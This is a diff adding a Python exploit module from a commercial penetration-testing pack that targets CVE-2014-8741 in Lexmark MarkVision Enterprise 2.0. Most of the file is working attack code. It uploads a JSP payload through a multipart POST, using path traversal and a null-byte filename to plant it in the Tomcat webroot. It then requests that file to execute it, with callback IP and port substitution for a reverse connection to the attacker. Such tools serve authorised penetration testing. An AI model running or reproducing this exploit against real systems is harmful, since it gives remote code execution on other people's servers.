@@ -1,0 +1,132 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+import sys
+import time
+import os
+import random
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "Lexmark MarkVision Enterprise 2.0 Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote Code Execution in Lexmark MarkVision Enterprise"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Lexmark"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "MarkVision Enterprise 2.0"
+DOCUMENTATION["Date public"] = "2014.12.09"
+DOCUMENTATION["References"] = "http://support.lexmark.com/index?page=content&id=TE666&locale=EN&userlocale=EN_US"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2014-8741"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8741"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the JAVA node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_markvision/d2.jsp"    
+    self.protocol = "http"
+    self.port = 9788
+    self.sslport = 9788
+    self.https = 0
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.JAVASERVER]
+	
+  def upload_file(self):               
+    # Open JSP file
+    f = open(self.filename, "r")
+    fdata = f.read()
+    f.close()
+    
+    fdata = fdata.replace("CALLBACK_IP", self.callback.ip)
+    fdata = fdata.replace("CALLBACK_PORT", str(self.callback.port))    
+
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+
+    # Upload JSP file            
+    params = '-----------------880735062871553\r\nContent-Disposition: form-data; name="failure"\r\n\r\nd2d2\r\n-----------------880735062871553\r\nContent-Disposition: form-data; name="success"\r\n\r\nd2d2\r\n-----------------880735062871553\r\nContent-Disposition: form-data; name="datafile"; filename="/..\\..\\..\\tomcat\\webapps\\ROOT\\d2.jsp\x00.pdf"\r\nContent-Length: %d\r\n\r\n%s\r\n-----------------880735062871553--\r\n'%(len(fdata), fdata)      
+    url = '/mve/upload/gfd'        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    ua.addHeader("Content-Type", "multipart/form-data; boundary=---------------880735062871553") 
+    ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")       
+    data = ua.POST(mainurl, params)
+    	
+    # Execute uploaded JSP file
+    url = "/d2.jsp"
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    data = ua.GET(mainurl)    
+                		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))     
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
